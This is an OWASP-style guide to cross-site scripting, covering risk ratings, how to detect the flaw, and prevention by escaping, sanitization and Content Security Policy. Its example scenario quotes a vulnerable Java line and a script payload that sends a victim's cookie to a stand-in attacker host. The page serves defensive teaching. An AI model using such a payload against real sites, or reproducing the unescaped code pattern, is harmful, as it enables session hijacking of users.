# Cross-Site Scripting

> XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user supplied data using a browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

{% flowchart width=750 %}
st=>start: Threat Agents:>https://en.wikipedia.org/wiki/Threat_(computer)
e=>end:>https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology
op1=>operation: Attack Vectors
op2=>operation: Security Weaknesses
op3=>operation: Technical Impacts
op4=>operation: Business Impacts
st(right)->op1(right)->op2(right)->op3(right)->op4(right)
{% endflowchart %}

| Threat Agents <td>Attack Vectors</td><td colspan="2">Security Weakness</td><td>Technical Impacts</td><td>Business Impacts</td> |
| --- | --- | --- | --- | --- | --- |
| Application Specific | Exploitability => Easy | Prevalence => Common | Detectability => Average | Impact => Severe | App/Business Specific |
| Consider anyone who can send untrusted data to the system,including external users, business partners, other systems, internal users, and administrators. | Attackers send text-based attack scripts that exploit the interpreter in the browser. Almost any source of data can be an attack vector, including internal sources such as data from the database. <td colspan="2">XSS flaws occur when an application updates a webpage with attacker controlled data without properly escapingthat content or using a safe JavaScript API. There are two primary categories of XSS flaws: (1) Stored, and (2) Reflected, and each of these can occur on (a) the Serveror (b) on the Client. Detection of most Server XSSflaws is fairly easy via testing or code analysis. Client XSScan be very difficult to identify.</td> <td>Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.</td><td>Consider the business value of the affected system and all the data it processes.Also consider the business impact of public exposure of the vulnerability.</td> |

## Detecting Vulnerability

* You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output
* And not using context-sensitive escaping to ensure it cannot run.
* If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS.
* Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.
* Automated tools can find some XSS problems automatically.
* Each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies.
* This diversity makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries.
* Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.

## Preventing Vulnerability

Preventing XSS requires separation of untrusted data from active browser content.

1. To avoid Server XSS, the preferred option is to properly escape untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into.
2. To avoid Client XSS, the preferred option is to avoid passing untrusted data to JavaScript and other browser APIs that can generate active content. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP DOM based XSS Prevention Cheat Sheet.
3. For rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.
4. Consider Content Security Policy (CSP) to defend against XSS across your entire site.

## Example Attack Scenarios

* The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

    `(String) page += "<input name='creditcard' type='TEXT'value='" + request.getParameter("CC") + "'>";`

    The attacker modifies the ‘CC’ parameter in his browser to:

    `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.`

    This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ.

## References

[Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)

[Cross-Site Scripting Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
